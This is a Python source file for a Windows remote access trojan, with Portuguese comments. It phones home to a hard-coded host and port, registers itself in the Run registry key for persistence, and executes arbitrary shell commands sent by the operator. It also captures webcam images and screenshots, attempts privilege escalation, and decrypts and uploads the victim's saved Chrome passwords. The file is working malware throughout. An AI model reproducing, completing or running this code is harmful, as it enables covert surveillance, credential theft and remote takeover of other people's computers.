import socket
import os
import subprocess
import ctypes
import threading
import time
import tempfile
import getpass, platform
import json
import base64
import sqlite3
import shutil

import win32crypt
import geocoder
import cv2
import pyautogui
from Crypto.Cipher import AES
from requests import get
from winreg import *
from elevate import elevate
from datetime import timezone, datetime, timedelta

try:
    ip = get("https://api.ipify.org/").text
except:
    ip = 'ERRO'
    pass

username = getpass.getuser()
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
geo = geocoder.ip('me')

TEMPDIR = tempfile.gettempdir()

ip = "192.168.0.117"
port = 443

path = os.path.realpath(__file__)
run = r"Software\Microsoft\Windows\CurrentVersion\Run"

info = "\nHostname = {}\nUser = {}\n\nIP = {}\n{}\nLatElong = {}\n\nplatformNode = {}\nSystem = {}\narquitetura = {}\n\n> Raw:\n{}\n".format(hostname, username,IPAddr, geo, geo.latlng, platform.node(), platform.system(),platform.processor(), platform.uname())

def autorun():
    #privilegeEscalation()
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_SET_VALUE)
    except PermissionError:
        file = os.path.basename(__file__).replace(".py", ".exe")
        #subprocess.Popen("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(file), shell=True)
    else:
        SetValueEx(key, 'JOABE', 0, REG_SZ, path)
        key.Close()
    # Pasta %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\

def conn(ip, port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip, port))
        try:
            client.send(info.encode())
        except:
            client.send("[+] Connected\n".encode())
        return client
    except Exception as error:
        # Lembre-se joabe que essa linha de print nao vai ta no codigo final
        print("Conectando.... Esperando a resposta do server")

def cmd(client, data):
    try:
        if data[:2].decode() == "cd":
            try:
                diret = data[3:].decode().strip()
                os.chdir(diret)
                diretorio = os.getcwd()
                client.send(diretorio.encode()+"\n".encode())
            except Exception as erro:
                print(erro)
                client.send("[-]Este Diretorio e inexistente[-]\n".encode())
        else:
            exec_cmd = subprocess.Popen(data.decode(), shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = exec_cmd.stdout.read() + exec_cmd.stderr.read() 
            if len(output) > 0:
                client.send(output+"\n".encode())
            else:
                client.send(" ".encode())
    except Exception as error:
        print("Erro no CMD: ", error)

def isAdmin(client):
    try:
        admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        admin = 0
        client.send("Nao foi possivel verificar o seus privilegios\n".encode())
    return admin

def privilegeEscalation():
    try:
        elevate()
        return True
    except:
        return False

def webcam(client, data):
    global TEMPDIR
    try:
        try:
            os.system("setx OPENCV_VIDEOIO_PRIORITY_MSMF 0")
        #    client.send("[+]OPENCV_VIDEOIO_PRIORITY_MSM, Tudo certo[+]\n".encode())
        except:
            pass
        #    client.send("[-]OPENCV_VIDEOIO_PRIORITY_MSM, Tudo errado[-]\n".encode())
        
        camera = cv2.VideoCapture(0)
        if camera.isOpened():
            value, frame = camera.read()
            if value:
                    cv2.imwrite("{}\\webcam.png".format(TEMPDIR), frame, [int(cv2.IMWRITE_PNG_COMPRESSION), 85])
        camera.release()
        time.sleep(2)
        upload("{}\\webcam.png".format(TEMPDIR), client, True)
    except:
        client.send("[x]Erro na captura\n".encode())
        client.send("[X] Webcam_snap deu erro [x]\n".encode())

def screenshot(client):
    try:
        global TEMPDIR
        print("screenshoting")
        pyautogui.screenshot('{}\\screenshot.png'.format(TEMPDIR))
        upload("{}\\screenshot.png".format(TEMPDIR), client, True)
    except Exception as error:
        client.send("[-]Nao foi possivel tira screenshot da tela[-]\n".encode())
        print(error)

def cli(client):
    try:
        while True:
            data = client.recv(2048)
            sdata = str(data.decode()).strip()
            if sdata.lower() == "/exit":
                break
            elif sdata.lower() == "/kill":
                exit(1)
            elif sdata.lower() == "/ip":
                client.send(str(ip).encode())
            elif sdata.lower() == "/info":
                client.send(info.encode())
            elif sdata.lower() == "/checkadmin":
                if isAdmin(client):
                    client.send("Voce tem acesso administrativo\n".encode())
                else:
                    client.send("Voce nao tem acesso administrativo\n".encode())
            elif sdata.lower() == "/getadmin":
                client.send("Tentando pegar o acesso administrativo....\n".encode())
                time.sleep(2)
                privilege = privilegeEscalation()
                if privilege:
                    client.send("Voce tem acesso administrativo!!!\n".encode())
                else:
                    client.send("Voce nao tem acesso administrativo\n".encode())
            elif sdata.lower() == "/webcam":
                #threading.Thread(target=webcam, args=(client, data)).start()
                webcam(client, data)
            elif sdata.lower() == "/screenshot":
                screenshot(client)
            elif sdata.lower() == "/sessioncap":
                sessionsCapture(client)
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        print("Erro no main: ", error)
        client.close()

def upload(file, client, delFile):
    try:
        print("uploading...")
        with open(file, 'rb') as f:
            i = f.read()
            while i:
                client.send(i)
                i = f.read()
        time.sleep(1)
        client.send("complete".encode())
        if delFile:
            os.remove(file)
        time.sleep(2)
        client.send("\n[+] arquivo foi removido da pasta TEMP [+]\n".encode())
        print('finish...')
    except:
        client.send("Error no upload".encode())

def data_hora_chrome(chrome_data):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def busca_chave_de_criptografia():
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
    arquivo_crypt = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")

    with open(arquivo_crypt, "r", encoding="UTF-8") as f:
        data_state = f.read()
        data_state = json.loads(data_state)

    encrypt_base64_key = base64.b64decode(data_state["os_crypt"]["encrypted_key"])
    encrypt_base64_key = encrypt_base64_key[5:]

    return win32crypt.CryptUnprotectData(encrypt_base64_key, None, None, None, 0)[1]

def password_decrypt(password, key_crypt):
    try:
        iv = password[3:15]
        password = password[15:]

        cifra = AES.new(key_crypt, AES.MODE_GCM, iv)

        return cifra.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0))[1]
        except:
            return "Nenhuma Senha Encontrada"

def sessionsCapture(client):
    global TEMPDIR

    data = ""
    
    key = busca_chave_de_criptografia()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")    
    filename = "{}\\ChromePasswords.db".format(TEMPDIR)
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        pass_password = password_decrypt(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]

        if user_name or pass_password:
            data += f"\nURL Principal:  {main_url}\n"
            data += f"URL Login: {login_page_url}\n"
            data += f"Nome Do Usuario: {user_name}\n"
            data += f"Senha Do Usuario: {pass_password}\n"
        else:
            continue

        if date_of_creation != 86400000000 and date_of_creation:
            data += f"Data De Criação: {str(data_hora_chrome(date_of_creation))}\n"

        if last_usuage != 86400000000 and last_usuage:
            data += f"Usado Utimamente: {str(data_hora_chrome(last_usuage))}\n"
        data += "="*100
    cursor.close()
    db.close()
    with open("{}\\logS.txt".format(TEMPDIR), "w") as f:
        f.write(data)
        
    upload("{}\\logS.txt".format(TEMPDIR), client, True)
    
if __name__ == "__main__":
    autorun()
    while True:
        try:
            client = conn(ip, port)
            if client:
                cli(client)
            else:
                time.sleep(5)
        except KeyboardInterrupt:
            break
        except Exception as error:
            print("Erro __main__: ",error)
